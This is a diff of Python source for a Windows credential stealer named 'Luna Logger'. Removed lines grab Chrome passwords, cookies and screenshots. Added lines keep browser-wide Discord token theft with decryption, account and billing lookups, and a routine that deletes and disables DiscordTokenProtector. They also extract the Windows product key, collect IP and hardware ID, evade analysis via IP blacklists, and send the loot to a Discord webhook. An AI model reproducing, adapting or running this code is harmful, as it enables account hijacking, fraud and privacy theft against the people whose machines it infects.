@@ -1,11 +1,4 @@
 import os
-import requests
-import wmi
-import uuid
-import sqlite3
-import base64
-from threading import Thread
-from zipfile import ZipFile
 from base64 import b64decode
 from json import dump, load, loads
 from re import findall
@@ -13,21 +6,12 @@ from subprocess import PIPE, Popen
 from time import localtime, strftime
 from urllib.request import urlopen
 from winreg import HKEY_LOCAL_MACHINE, OpenKey, QueryValueEx
-from sqlite3 import connect
 
 import psutil
-import platform
-import re
-import json
-import shutil
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
-from shutil import copy2
-from discord import Embed, RequestsWebhookAdapter, Webhook, File
+from discord import Embed, RequestsWebhookAdapter, Webhook
 from httpx import get as httpget
-from win32con import FILE_ATTRIBUTE_HIDDEN
-from PIL import ImageGrab
-from win32api import SetFileAttributes
 from requests import get
 from win32crypt import CryptUnprotectData
 
@@ -39,32 +23,13 @@ def main(webhook):
     webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
     embed = Embed(title="Luna Logger", color=5639644)
     
-    get_inf()
     grabtokens()
-
-    threads = []
-    for thread in [
-        Thread(target=ss),
-        Thread(target=password),
-        Thread(target=cookies),
-        ]:
-        
-        thread.start()
-        threads.append(thread)
-        
-    for t in threads:
-            t.join()
     
-    embed.set_author(name=f"{strftime('%D | %H:%M:%S', localtime())}")
-    embed.set_footer(text="Luna | Created with ♥ by Luna's Dev Team")
+    embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
+    embed.set_footer(text="Luna | Created with ♥ by addidix.#0506")
     embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
     
-    zipup()
-        
-    file = None
-    file = File(f'files-{os.getenv("UserName")}.zip')
-
-    webhook.send(content="@everyone", embed=embed, file=file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+    webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
 def Luna():
     for function in [debug(),
@@ -74,209 +39,39 @@ def Luna():
             function()
         except:
             pass
-
-def get_inf():
-    ip_address = requests.get('http://ipinfo.io/json').json()['ip']
-    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])
-
-    cwd = os.getcwd()
-    pc_username = os.getenv("UserName")
-    pc_name = os.getenv("COMPUTERNAME")
-    computer_os = platform()
-    
-    cpu = wmi.WMI().Win32_Processor()[0]
-    gpu = wmi.WMI().Win32_VideoController()[0]
-    ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
   
-    embed.add_field(name="PC INFO", value=f"```\nIP: {ip_address}\nMAC: {mac_address}\n\nPC Username: {pc_username}\nPC Name: {pc_name}\nOS: {computer_os}\nHWID: {hwid}CPU: {cpu.Name}\nGPU: {gpu.Name}\nRAM: {ram}GB\n```", inline=False)
-
-def ss():
-    ImageGrab.grab().save("screenshot.png")
-    hide("screenshot.png")
-
-def hide(file):
-    SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
-
-
 class grabtokens():
-	def __init__(self):
-
-		self.baseurl = "https://discord.com/api/v9/users/@me"
-		self.appdata = os.getenv("localappdata")
-		self.roaming = os.getenv("appdata")
-		self.tempfolder = os.getenv("temp")+"\\Peg_Grabber"
-		self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
-		self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
-
-		try:
-			os.mkdir(os.path.join(self.tempfolder))
-		except Exception:
-			pass
-
-		self.tokens = []
-		self.discord_psw = []
-		self.backup_codes = []
-		
-		self.grabTokens()
-	
-	def getheaders(self, token=None, content_type="application/json"):
-		headers = {
-			"Content-Type": content_type,
-			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-		}
-		if token:
-			headers.update({"Authorization": token})
-		return headers
-	
-	def get_master_key(self, path):
-		with open(path, "r", encoding="utf-8") as f:
-			local_state = f.read()
-		local_state = json.loads(local_state)
-
-		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-		master_key = master_key[5:]
-		master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-		return master_key
-	
-	def decrypt_password(self, buff, master_key):
-		try:
-			iv = buff[3:15]
-			payload = buff[15:]
-			cipher = AES.new(master_key, AES.MODE_GCM, iv)
-			decrypted_pass = cipher.decrypt(payload)
-			decrypted_pass = decrypted_pass[:-16].decode()
-			return decrypted_pass
-		except Exception:
-			return "Failed to decrypt password"
-		
-	def grabTokens(self):
-		global token, tokens
-		
-		paths = {
-			'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
-			'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
-			'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
-			'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
-			'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-			'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-			'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
-			'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
-			'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
-			'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-			'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-			'7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-			'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-			'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-			'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-			'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-			'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-			'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
-			'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-			'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-			'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-			'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
-		}
-		
-		for _, path in paths.items():
-			if not os.path.exists(path):
-				continue
-			if not "discord" in path:
-				for file_name in os.listdir(path):
-					if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-						continue
-					for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-						for regex in (self.regex):
-							for token in findall(regex, line):
-								try:
-									r = requests.get(self.baseurl, headers=self.getheaders(token))
-								except Exception:
-									pass
-								if r.status_code == 200 and token not in self.tokens:
-									self.tokens.append(token)
-			else:
-				if os.path.exists(self.roaming+'\\discord\\Local State'):
-					for file_name in os.listdir(path):
-						if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-							continue
-						for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-							for y in findall(self.encrypted_regex, line):
-								token = None
-								token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
-								
-								r = requests.get(self.baseurl, headers=self.getheaders(token))
-								if r.status_code == 200 and token not in self.tokens:
-									self.tokens.append(token)
-
-		if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-			for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-				for _file in files:
-					if not _file.endswith('.sqlite'):
-						continue
-					for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-						for regex in (self.regex):
-							for token in findall(regex, line):
-								try:
-									r = requests.get(self.baseurl, headers=self.getheaders(token))
-								except Exception:
-									pass
-								if r.status_code == 200 and token not in self.tokens:
-									self.tokens.append(token)
-		
-		for token in self.tokens:
-			r = requests.get(
-				'https://discord.com/api/v9/users/@me',
-				headers={"Authorization": token})
-				
-			username = r.json()['username'] + '#' + r.json()['discriminator']
-			uid = r.json()['id']
-			phone = r.json()['phone']
-			email = r.json()['email']
-			
-			try:
-				if r.json()['premium_type'] == 1:
-					nitro = 'Nitro Classic'
-				elif r.json()['premium_type'] == 2:
-					nitro = 'Nitro Boost'
-			except IndexError:
-				nitro = 'None'
-
-			b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", 
-							headers=self.getheaders(token))
-			
-			if b.json() == []:
-				methods = "None"
-			else:
-				methods = ""
-				for method in b.json():
-					if method['type'] == 1:
-						methods += "💳"
-					elif method['type'] == 0:
-						methods += "<:paypal:973417655627288666>"
-					else:
-						methods += "❓"
-      
-			embed.add_field(name=f"Username: `{username} ({uid})`", value=f"```{token}```\n\n**Email:** `{email}`\n**Phone:** `{phone}`\n**Nitro:** `{nitro}`\n**Methods:** `{methods}`", inline=False)
-
-
-class password():
     def __init__(self):
+
+        self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
+        self.tempfolder = os.getenv("temp")+"\\Peg_Grabber"
+        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
 
-        with open("google-passwords.txt", "w") as f:
-            f.write("luna /// Google Chrome Passwords\n\n")
-        hide(".\\google-passwords.txt")
+        try:
+            os.mkdir(os.path.join(self.tempfolder))
+        except Exception:
+            pass
+
+        self.tokens = []
+        self.discord_psw = []
+        self.backup_codes = []
         
-        if os.path.exists(self.appdata+'\\Google'):
-            self.grabPassword_chrome() 
-        
-        return
-        
-    def get_master_key(self):
-        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
+        self.grabTokens()
+    
+    def getheaders(self, token=None, content_type="application/json"):
+        headers = {
+            "Content-Type": content_type,
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+        }
+        if token:
+            headers.update({"Authorization": token})
+        return headers
+    
+    def get_master_key(self, path):
+        with open(path, "r", encoding="utf-8") as f:
             local_state = f.read()
         local_state = loads(local_state)
 
@@ -284,6 +79,38 @@ class password():
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
+         
+    def bypassTokenProtector(self):
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        config = tp+"config.json"
+        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
+            try:
+                os.remove(tp+i)
+            except Exception:
+                pass 
+        try:
+            with open(config) as f:
+                item = load(f)
+                item['auto_start'] = False
+                item['auto_start_discord'] = False
+                item['integrity'] = False
+                item['integrity_allowbetterdiscord'] = False
+                item['integrity_checkexecutable'] = False
+                item['integrity_checkhash'] = False
+                item['integrity_checkmodule'] = False
+                item['integrity_checkscripts'] = False
+                item['integrity_checkresource'] = False
+                item['integrity_redownloadhashes'] = False
+                item['iterations_iv'] = 364
+                item['iterations_key'] = 457
+                item['version'] = 69420
+
+            with open(config, 'w') as f:
+                dump(item, f, indent=2, sort_keys=True)
+
+
+        except Exception:
+            pass
     
     def decrypt_password(self, buff, master_key):
         try:
@@ -293,148 +120,142 @@ class password():
             decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
-        except:
-            return "Chrome < 80"
-    
-    def grabPassword_chrome(self):
-        master_key = self.get_master_key()
-        
-        login_dbs = [
-            self.appdata + '\\Google\\Chrome\\User Data\\Default\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
-        ]      
-            
-        used_login_dbs = []
-        
-        for login_db in login_dbs:
-            if not os.path.exists(login_db):
-                continue
-            
-            used_login_dbs.append(login_db)
-            
-            try:
-                copy2(login_db, "Loginvault.db")
-            except FileNotFoundError:
-                pass
-            conn = connect("Loginvault.db")
-            cursor = conn.cursor()
-            try:
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                for r in cursor.fetchall():
-                    url = r[0]
-                    username = r[1]
-                    encrypted_password = r[2]
-                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
-                    if url != "" and username != "" and decrypted_password != "":
-                        with open("google-passwords.txt", "a") as f:
-                            f.write(f"DB: {login_db}\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
-            except:
-                pass
-            cursor.close()
-            conn.close()
-            try:
-                os.remove("Loginvault.db")
-            except:
-                pass
-            
-        with open(".\\google-passwords.txt", "a") as f:
-            f.write("\n\nUsed Login Dbs:\n")
-            f.write("\n".join(used_login_dbs))    
-            
-class cookies():
-    def __init__(self):
-        self.appdata = os.getenv("localappdata")
-        
-        with open(".\\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
-            f.write("pegasus /// Google Chrome Cookies\n\n")
-        hide(".\\google-cookies.txt")
-        
-        if os.path.exists(self.appdata+'\\Google'):
-            self.grabCookies_Chrome() 
-        return
-    
-    def get_master_key(self, path) -> str:
-        with open(path, "r", encoding="utf-8") as f:
-            c = f.read()
-        local_state = json.loads(c)
-
-        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        return master_key
-    
-    def decrypt_val(self, buff, master_key) -> str:
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
         except Exception:
             return "Failed to decrypt password"
-        
-    def grabCookies_Chrome(self):
-        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
-        
-        login_dbs = [
-            self.appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\cookies',
-        ] 
-        
-        used_login_dbs = []
-        
-        for login_db in login_dbs:
-            if not os.path.exists(login_db):
-                continue
-            used_login_dbs.append(login_db)
-            login = ".\\Loginvault2.db"
-            shutil.copy2(login_db, login)
-            conn = sqlite3.connect(login)
-            cursor = conn.cursor()
-            with open(".\\google-cookies.txt", "a", encoding="cp437", errors='ignore') as f:
-                cursor.execute(
-                    "SELECT host_key, name, encrypted_value from cookies")
-                for r in cursor.fetchall():
-                    host = r[0]
-                    user = r[1]
-                    decrypted_cookie = self.decrypt_val(r[2], master_key)
-                    if host != "":
-                        f.write(
-                            f"DB: {login_db}\nHost: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-            cursor.close()
-            conn.close()
-            os.remove(login)
-            
-        with open(".\\google-cookies.txt", "a") as f:
-            f.write("\n\nUsed Login Dbs:\n")
-            f.write("\n".join(used_login_dbs))
-
-def zipup():
-    with ZipFile(f'files-{os.getenv("UserName")}.zip', 'w') as zipf:
-        zipf.write("google-passwords.txt")
-        zipf.write("google-cookies.txt")
-        zipf.write("screenshot.png")
     
-    hide(f'files-{os.getenv("UserName")}.zip')
+    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
+        def strToInt(x):
+            if isinstance(x, str):
+                return ord(x)
+            return x
+        chars = 'BCDFGHJKMPQRTVWXY2346789'
+        wkey = ''
+        offset = 52
+        regkey = OpenKey(HKEY_LOCAL_MACHINE,path)
+        val, _ = QueryValueEx(regkey, 'DigitalProductId')
+        productName, _ = QueryValueEx(regkey, "ProductName")
+        key = list(val)
+
+        for i in range(24,-1, -1):
+            temp = 0
+            for j in range(14,-1,-1):
+                temp *= 256
+                try:
+                    temp += strToInt(key[j+ offset])
+                except IndexError:
+                    return [productName, ""]
+                if temp / 24 <= 255:
+                    key[j+ offset] = temp/24
+                else:
+                    key[j+ offset] = 255
+                temp = int(temp % 24)
+            wkey = chars[temp] + wkey
+        for i in range(5,len(wkey),6):
+            wkey = wkey[:i] + '-' + wkey[i:]
+        return [productName, wkey]
         
-def cleanup():
-    for clean in [os.remove("google-passwords.txt"),
-                  os.remove("google-cookies.txt"),
-                  os.remove("screenshot.png"),
-                  os.remove(f"files-{os.getenv('UserName')}.zip")]:
+    def grabTokens(self):
+        global token, tokens
+        
+        paths = {
+            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+        }
+        
+        for _, path in paths.items():
+            if not os.path.exists(path):
+                continue
+            if not "discord" in path:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
+                                try:
+                                    r = get(self.baseurl, headers=self.getheaders(token))
+                                except Exception:
+                                    pass
+                                if r.status_code == 200 and token not in self.tokens:
+                                    self.tokens.append(token)
+            else:
+                if os.path.exists(self.roaming+'\\discord\\Local State'):
+                    for file_name in os.listdir(path):
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in findall(self.encrypted_regex, line):
+                                token = None
+                                token = self.decrypt_password(b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                                
+                                r = get(self.baseurl, headers=self.getheaders(token))
+                                if r.status_code == 200 and token not in self.tokens:
+                                    self.tokens.append(token)
 
-        try: clean()
-        except: pass       
-
+        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+                for _file in files:
+                    if not _file.endswith('.sqlite'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
+                                try:
+                                    r = get(self.baseurl, headers=self.getheaders(token))
+                                except Exception:
+                                    pass
+                                if r.status_code == 200 and token not in self.tokens:
+                                    self.tokens.append(token)
+        
+        for token in self.tokens:
+            r = get(
+                'https://discord.com/api/v9/users/@me',
+                headers={"Authorization": token})
+ 
+            username = r.json()['username'] + '#' + r.json()['discriminator']
+            phone = r.json()['phone']
+            email = r.json()['email']
+            mfa_enabled = r.json()['mfa_enabled']
+            billing = bool(len(loads(httpget(
+                "https://discord.com/api/v9/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+            ip = load(urlopen('https://jsonip.com/'))['ip']
+            hwid = (Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE).stdout.read()
+                    + Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE).stderr.read()).decode().split("\n")[1]
+            
+            embed.add_field(name=f'User: `{username}`', value=f"Token: `{token}`", inline=False)
+            
+            embed.add_field(name=f'Phone:', value=f"`{phone}`", inline=True)
+            embed.add_field(name=f'Email:', value=f"`{email}`", inline=True)
+            embed.add_field(name=f'MFA:', value=f"`{mfa_enabled}`", inline=True)
+            embed.add_field(name=f'Billing:', value=f"`{billing}`", inline=True)
+            embed.add_field(name=f'IP:', value=f"`{ip}`", inline=True)
+            embed.add_field(name=f'HWID:', value=f"`{hwid}`", inline=True)
+            
+            embed.add_field(name='\u200b', value="\u200b", inline=False)
+            
+    
+    def get_token_data(self):
+        pass
 
 class cleaner:
     def __init__(self):
@@ -469,8 +290,11 @@ class debug:
                 self.self_destruct()
         
     def get_ip(self):
-        ip = requests.get('http://ipinfo.io/json').json()['ip']
-            
+        url = 'https://jsonip.com/'
+        response = urlopen(url)
+        data = load(response)
+        ip = data['ip']
+        
         if ip in self.blackListedIPS:
             return True
         
@@ -494,14 +318,7 @@ class debug:
             return True
         
     def self_destruct(self):
-        os.system("del {}\{}".format(os.path.dirname(__file__), os.path.basename(__file__)))
         exit()
-    
-if __name__ == '__main__':
-    if os.name != "nt":
-        exit()
-    
-    try: debug(); Luna()
-    except:
-        try: cleanup()
-        except: exit()
+        
+if __name__ == "__main__":
+    Luna()
